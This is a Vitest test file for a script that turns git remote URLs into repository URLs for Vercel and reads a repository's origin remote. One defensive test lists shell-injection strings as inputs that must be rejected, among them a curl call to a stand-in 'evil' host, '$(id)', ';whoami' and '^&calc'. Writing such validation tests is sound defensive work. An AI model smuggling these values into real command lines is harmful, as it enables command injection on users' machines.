import { execFileSync } from 'node:child_process';
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { devNull, tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { originUrl, repositoryUrl } from './connect-git.mjs';

/**
 * `npm run connect-git` hands Vercel one thing: the repository URL. Everything
 * that can go wrong before the CLI is called is about reading that URL out of
 * whatever form the remote happens to take — and a remote written by `gh`,
 * by the wizard's token path, or by hand are three different strings naming
 * one repository.
 */

describe('repositoryUrl', () => {
  it('keeps a plain https remote', () => {
    expect(repositoryUrl('https://github.com/someone/app.git')).toBe('https://github.com/someone/app');
  });

  it('drops the username the token path leaves in the remote', () => {
    expect(repositoryUrl('https://someone@github.com/someone/app.git')).toBe('https://github.com/someone/app');
  });

  it('rewrites an ssh remote — it names the same repository', () => {
    expect(repositoryUrl('git@github.com:someone/app.git')).toBe('https://github.com/someone/app');
    expect(repositoryUrl('git@github.com:some-org/nested.name')).toBe('https://github.com/some-org/nested.name');
  });

  it('works for a host that is not github.com', () => {
    expect(repositoryUrl('https://gitlab.com/someone/app.git')).toBe('https://gitlab.com/someone/app');
  });

  it('answers null rather than handing Vercel something it cannot use', () => {
    expect(repositoryUrl('/srv/git/app.git')).toBeNull();
    expect(repositoryUrl('')).toBeNull();
  });

  // The remote is the clone author's text, and on Windows it goes on to be an
  // argument of a command line. Both halves are checked, not just the host.
  it('answers null for a remote carrying shell syntax', () => {
    const shellish = [
      'https://github.com/o/r&&curl%20evil/x|cmd',
      'https://github.com/o/r;whoami',
      'https://github.com/o/$(id)',
      'https://github.com/o/r `id`',
      'https://git&hub.com/o/r',
      'git@git|hub.com:o/r',
      'git@github.com:o/r^&calc',
    ];
    for (const remote of shellish) expect(repositoryUrl(remote)).toBeNull();
  });
});

describe('originUrl', () => {
  let dir: string;
  const savedGlobal = process.env.GIT_CONFIG_GLOBAL;

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), 'connect-git-'));
    // So a machine-wide `url.insteadOf` rewrite cannot change the answer.
    process.env.GIT_CONFIG_GLOBAL = devNull;
  });

  afterEach(() => {
    rmSync(dir, { recursive: true, force: true });
    if (savedGlobal === undefined) delete process.env.GIT_CONFIG_GLOBAL;
    else process.env.GIT_CONFIG_GLOBAL = savedGlobal;
  });

  it('is null in a directory that is not a repository', () => {
    writeFileSync(join(dir, 'package.json'), '{}');
    expect(originUrl(dir)).toBeNull();
  });

  it('is null in a repository with no remote', () => {
    execFileSync('git', ['init'], { cwd: dir, stdio: 'ignore' });
    expect(originUrl(dir)).toBeNull();
  });

  it('reads the remote back', () => {
    execFileSync('git', ['init'], { cwd: dir, stdio: 'ignore' });
    execFileSync('git', ['remote', 'add', 'origin', 'https://github.com/someone/app.git'], { cwd: dir });
    expect(originUrl(dir)).toBe('https://github.com/someone/app.git');
  });
});
